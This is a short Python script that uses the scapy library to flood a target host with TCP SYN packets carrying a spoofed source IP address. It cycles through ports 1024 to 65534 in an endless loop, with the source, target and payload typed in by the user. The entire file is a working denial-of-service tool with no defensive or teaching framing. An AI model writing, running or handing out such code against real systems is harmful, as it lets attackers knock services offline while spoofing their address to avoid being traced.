#!/usr/bin/python
#-*- coding:utf-8 -*-
#Author: Isaac Privett
#Date: 05-03-2022
#Desciption: Python program that syn floods a target host with spoofed IP address

from scapy.all import *

def synflood(src,tgt,message):
	for dport in range(1024,65535):
		IPlayer = IP(src=src, dst=tgt)
		TCPlayer = TCP(sport=4444, dport=dport)
		RAWlayer = Raw(load=message)
		pkt = IPlayer/TCPlayer/RAWlayer
		send(pkt)

source = input("[*] Enter source IP address to fake: ")
target = input("[*] Enter target host IP address: ")
message = input("[*] Enter message for TCP payload: ")

while True:
	synflood(source,target,message)
